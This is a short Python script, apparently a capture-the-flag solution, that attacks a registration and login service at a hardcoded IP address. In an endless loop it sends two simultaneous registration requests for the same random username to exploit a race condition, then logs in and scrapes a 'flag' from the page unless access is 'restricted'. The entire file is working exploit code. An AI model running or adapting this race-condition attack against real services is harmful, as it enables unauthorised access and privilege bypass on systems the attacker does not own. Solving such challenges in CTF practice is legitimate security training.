import requests
import string
import re
import random
import threading
url_register = "http://3.16.68.122/smf/register.php"
url_login = "http://3.16.68.122/smf/login.php"


def register(data):
    requests.post(url_register, data=data)

def login(data):
    c = requests.post(url_login, data=data).content
    flag = re.findall(r"<h2>(.*)</h2>\s+<h2>", c, re.DOTALL)
    if len(flag) > 0 and not "restricted" in flag[0]:
        print "[*] flag: '" + flag[0] + "'"
    else:
        print "[x] fail"

while True:
    # Generate random username 
    username = ''.join(random.choice(string.ascii_letters) for _ in range(100))
    password = '123'

    # register 
    data = { 'username' : username, 'password' : password }
    t1 = threading.Thread(target=register, args=(data,))
    t2 = threading.Thread(target=register, args=(data,))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    print "[*] Registered twice"

    # check login
    login(data)
